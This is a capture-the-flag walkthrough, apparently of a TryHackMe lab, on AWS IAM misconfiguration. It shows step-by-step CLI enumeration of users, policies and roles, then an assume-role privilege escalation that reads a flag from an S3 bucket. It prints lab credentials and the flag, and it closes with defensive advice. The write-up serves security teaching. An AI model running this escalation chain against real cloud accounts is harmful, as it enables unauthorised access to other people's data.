# AWS Security: S3cret Santa

Learn the basics of AWS enumeration and exploit misconfigured IAM permissions to access sensitive S3 buckets.

## Solution:

- Started by understanding the story: An infiltrated elf discovered cloud credentials in Sir Carrotbane's office
- Need to use these credentials to enumerate AWS resources and regain access to TBFC's cloud network
- Goal is to identify misconfigurations in IAM permissions and access sensitive data in S3

### Step 1: Understanding AWS Access

- **AWS Programmatic Access**: Uses Access Key ID and Secret Access Key for CLI/API authentication
- Credentials are pre-configured in the target machine at `~/.aws/credentials`
- **AWS STS (Security Token Service)**: Manages temporary security credentials and role assumptions

![AWS Credentials Location](https://i.imgur.com/placeholder1.png)

### Step 2: Verifying AWS CLI Configuration

- Used STS to verify the configured identity:

```
aws sts get-caller-identity
```

**Output:**
```
{
    "UserId": "AIDAU2VYTBGYOHNOCJMX3",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/sir.carrotbane"
}
```

- Confirmed credentials belong to user `sir.carrotbane`
- Account number: `123456789012`

![STS Get Caller Identity](https://i.imgur.com/placeholder2.png)

**Answer 1:** `123456789012`

### Step 3: Understanding IAM Components

**Key IAM Concepts:**

- **IAM Users**: Single identities with credentials (passwords/access keys) and assigned permissions
- **IAM Groups**: Collection of users for easier access management
- **IAM Roles**: Temporary identities that can be assumed by users, services, or external accounts
- **IAM Policies**: JSON documents defining permissions (actions, resources, conditions, principals)

**Example Policy Structure:**
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123456789012:user/Alice"},
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::my-private-bucket/*"
    }
  ]
}
```

![IAM Policy Structure](https://i.imgur.com/placeholder3.png)

**Answer 2:** `policy`

### Step 4: Enumerating Users

- Listed all IAM users in the account:

```
aws iam list-users
```

- Output showed user creation dates and other metadata
- Confirmed `sir.carrotbane` exists in the account

![List IAM Users](https://i.imgur.com/placeholder4.png)

### Step 5: Enumerating User Policies

**Two types of policies:**
- **Inline policies**: Hard-coded directly in user/group/role (deleted with identity)
- **Attached/Managed policies**: Reusable across multiple identities

**Checking inline policies:**
```bash
aws iam list-user-policies --user-name sir.carrotbane
```

**Output:**
```
{
    "PolicyNames": [
        "SirCarrotbanePolicy"
    ]
}
```

![List User Policies](https://i.imgur.com/placeholder5.png)

**Checking attached policies:**
```
aws iam list-attached-user-policies --user-name sir.carrotbane
```

- No attached policies found

**Checking group membership:**
```
aws iam list-groups-for-user --user-name sir.carrotbane
```

- Not part of any groups

### Step 6: Analyzing the Inline Policy

- Retrieved the policy document:

```
aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
```

**Output:**
```
{
  "UserName": "sir.carrotbane",
  "PolicyName": "SirCarrotbanePolicy",
  "PolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Action": [
          "iam:ListUsers",
          "iam:ListGroups",
          "iam:ListRoles",
          "iam:ListAttachedUserPolicies",
          "iam:GetUserPolicy",
          "iam:GetGroupPolicy",
          "iam:GetRolePolicy",
          "iam:ListGroupsForUser",
          "sts:AssumeRole"
        ],
        "Effect": "Allow",
        "Resource": "*"
      }
    ]
  }
}
```

**Key Finding:** The `sts:AssumeRole` action allows privilege escalation!

![Policy Document](https://i.imgur.com/placeholder6.png)

**Answer 3:** `SirCarrotbanePolicy`

### Step 7: Enumerating IAM Roles

- Listed all roles in the account:

```
aws iam list-roles
```

**Output:**
```
{
  "Roles": [
    {
      "RoleName": "bucketmaster",
      "Arn": "arn:aws:iam::123456789012:role/bucketmaster",
      "AssumeRolePolicyDocument": {
        "Statement": [
          {
            "Action": "sts:AssumeRole",
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::123456789012:user/sir.carrotbane"
            }
          }
        ]
      }
    }
  ]
}
```

- Found `bucketmaster` role that can be assumed by `sir.carrotbane`

![List Roles](https://i.imgur.com/placeholder7.png)

### Step 8: Analyzing the bucketmaster Role

**Checking inline policies:**
```
aws iam list-role-policies --role-name bucketmaster
```

- Found one inline policy: `BucketMasterPolicy`

**Checking attached policies:**
```
aws iam list-attached-role-policies --role-name bucketmaster
```

- No attached policies

**Retrieving policy details:**
```
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```

**Output:**
```
{
  "PolicyDocument": {
    "Statement": [
      {
        "Action": ["s3:ListAllMyBuckets"],
        "Effect": "Allow",
        "Resource": "*"
      },
      {
        "Action": ["s3:ListBucket"],
        "Effect": "Allow",
        "Resource": [
          "arn:aws:s3:::easter-secrets-123145",
          "arn:aws:s3:::bunny-website-645341"
        ]
      },
      {
        "Action": ["s3:GetObject"],
        "Effect": "Allow",
        "Resource": "arn:aws:s3:::easter-secrets-123145/*"
      }
    ]
  }
}
```

**Permissions granted:**
- `s3:ListAllMyBuckets` - List all S3 buckets
- `s3:ListBucket` - List contents of specific buckets
- `s3:GetObject` - Retrieve objects from `easter-secrets-123145`

![Bucket Master Policy](https://i.imgur.com/placeholder8.png)

**Answer 4:** `ListAllMyBuckets`

### Step 9: Assuming the bucketmaster Role

- Used STS to generate temporary credentials for the role:

```
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
```

**Output:**
```
{
  "Credentials": {
    "AccessKeyId": "ASIARZPUZDIKDM4AUIJK",
    "SecretAccessKey": "WUzUY46CdgMOLkhuO5llc4G0W92QUaOBNhhzfmSm",
    "SessionToken": "FQoGZXIvYXdzEBYaDdK2KFhRR9GhgoUk9...",
    "Expiration": "2025-11-26T03:40:11.117460+00:00"
  },
  "AssumedRoleUser": {
    "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
  }
}
```

![Assume Role Output](https://i.imgur.com/placeholder9.png)

### Step 10: Configuring Temporary Credentials

- Exported the temporary credentials as environment variables:

```
export AWS_ACCESS_KEY_ID="ASIARZPUZDIKDM4AUIJK"
export AWS_SECRET_ACCESS_KEY="WUzUY46CdgMOLkhuO5llc4G0W92QUaOBNhhzfmSm"
export AWS_SESSION_TOKEN="FQoGZXIvYXdzEBYaDdK2KFhRR9GhgoUk9..."
```

- Verified role assumption:

```
aws sts get-caller-identity
```

**Output:**
```
{
    "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
}
```

- Confirmed we're now operating as the `bucketmaster` role

![Verify Role Assumption](https://i.imgur.com/placeholder10.png)

### Step 11: Understanding Amazon S3

- **S3 (Simple Storage Service)**: Object storage for any type of file
- **Buckets**: Directories/containers for storing objects in the cloud
- Common use cases: Website assets, backups, logs, documents, data lakes

![S3 Concept](https://i.imgur.com/placeholder11.png)

### Step 12: Listing S3 Buckets

- Listed all buckets in the account:

```
aws s3api list-buckets
```

**Output:**
```
{
  "Buckets": [
    {
      "Name": "easter-secrets-123145",
      "CreationDate": "2025-11-25T10:30:00.000Z"
    },
    {
      "Name": "bunny-website-645341",
      "CreationDate": "2025-11-20T08:15:00.000Z"
    }
  ]
}
```

- Identified suspicious bucket: `easter-secrets-123145`

![List Buckets](https://i.imgur.com/placeholder12.png)

### Step 13: Listing Bucket Contents

- Listed objects in the `easter-secrets-123145` bucket:

```
aws s3api list-objects --bucket easter-secrets-123145
```

**Output:**
```
{
  "Contents": [
    {
      "Key": "cloud_password.txt",
      "Size": 31,
      "LastModified": "2025-11-25T12:00:00.000Z"
    }
  ]
}
```

- Found file: `cloud_password.txt`

![List Objects](https://i.imgur.com/placeholder13.png)

### Step 14: Downloading the Sensitive File

- Retrieved the file from S3 to local machine:

```
aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
```

**Output:**
```
{
    "ContentLength": 31,
    "ContentType": "text/plain",
    "Metadata": {}
}
```

- File successfully downloaded to current directory

![Get Object](https://i.imgur.com/placeholder14.png)

### Step 15: Reading the Flag

- Read the contents of the downloaded file:

```
cat cloud_password.txt
```

**Output:**
```
THM{more_like_sir_cloudbane}
```

![Flag Contents](https://i.imgur.com/placeholder15.png)

## Flag:

```
THM{more_like_sir_cloudbane}
```

## Concepts learnt:

- **AWS IAM (Identity and Access Management)**: Service for managing users, groups, roles, and their permissions to AWS resources - critical for cloud security posture

- **IAM Policies**: JSON documents defining granular permissions using Effect (Allow/Deny), Action (what can be done), Resource (which AWS resources), and Principal (who can access)

- **Inline vs Managed Policies**: Inline policies are directly embedded in a single identity (deleted with it), while managed policies are standalone and reusable across multiple identities

- **IAM Roles**: Temporary identities with specific permissions that can be assumed by users, services, or external accounts - commonly used for privilege escalation

- **AWS STS (Security Token Service)**: Generates temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) for assuming roles with time-limited access

- **sts:AssumeRole Action**: Critical permission that allows privilege escalation by assuming different roles with potentially higher permissions - major security risk if misconfigured

- **AWS CLI Enumeration**: Using command-line tools to discover IAM users, policies, roles, and S3 resources - essential for offensive security assessments and penetration testing

- **Amazon S3 (Simple Storage Service)**: Object storage service organizing files into buckets - frequently misconfigured leading to data breaches at companies like Toyota, Accenture, Verizon

- **S3 Bucket Permissions**: Actions like `s3:ListAllMyBuckets`, `s3:ListBucket`, and `s3:GetObject` control who can view and access bucket contents

- **Least Privilege Principle**: Users should only have minimum permissions needed - this challenge demonstrated how overly permissive roles (bucketmaster) enable unauthorized data access

- **Cloud Credential Management**: Proper storage and rotation of access keys and secrets - leaving credentials on desktops (like Sir Carrotbane) enables complete account compromise

- **Privilege Escalation in Cloud**: Technique of moving from limited user permissions to higher-privilege roles by exploiting misconfigurations in IAM trust relationships

## Notes:

- **Critical security lesson**: The `sts:AssumeRole` permission combined with poorly configured role trust policies enables complete privilege escalation from a low-privilege user

- **Real-world attack path demonstrated**:
  1. Obtain initial credentials (phishing, stolen laptop, exposed keys)
  2. Enumerate IAM permissions with `list-*` and `get-*` commands
  3. Identify assumable roles with elevated privileges
  4. Assume role to gain temporary credentials
  5. Access sensitive resources (S3 buckets, databases, etc.)

- **AWS CLI enumeration commands used:**
  - `aws sts get-caller-identity` - Verify current identity
  - `aws iam list-users` - List all IAM users
  - `aws iam list-user-policies` - List inline policies
  - `aws iam get-user-policy` - Retrieve policy document
  - `aws iam list-roles` - List all IAM roles
  - `aws iam get-role-policy` - View role permissions
  - `aws sts assume-role` - Assume a different role
  - `aws s3api list-buckets` - List all S3 buckets
  - `aws s3api list-objects` - List objects in bucket
  - `aws s3api get-object` - Download file from S3

- **Common IAM misconfigurations** (highlighted in this challenge):
  - Overly permissive policies with `Resource: "*"`
  - Allowing `sts:AssumeRole` without proper restrictions
  - Roles with broad permissions accessible to low-privilege users
  - No MFA requirement for sensitive operations
  - Publicly accessible S3 buckets (not in this challenge but common)

- **Why this matters**: Major cloud breaches often stem from IAM misconfigurations - examples include:
  - Capital One breach (2019): Misconfigured WAF role with excessive S3 permissions
  - Imperva breach (2019): Exposed AWS API key led to customer data access
  - Facebook breach (2019): Plaintext passwords stored in S3 with broad access

- **Session tokens expire**: Temporary credentials from `assume-role` have expiration times (typically 1-12 hours) - attackers must work quickly or maintain persistence

- **Alternative approaches considered**:
  - Using AWS SDK (boto3 in Python) for programmatic access
  - Pacu framework for AWS penetration testing automation
  - ScoutSuite for comprehensive AWS security audits
  - CloudMapper for visualizing AWS infrastructure and permissions

- **Defense recommendations**:
  - Implement least-privilege IAM policies
  - Use IAM Access Analyzer to detect overly permissive policies
  - Enable CloudTrail logging for audit trails
  - Require MFA for sensitive operations
  - Regularly audit role trust relationships
  - Use AWS Organizations SCPs for guardrails
  - Rotate credentials regularly
  - Enable S3 bucket encryption and versioning


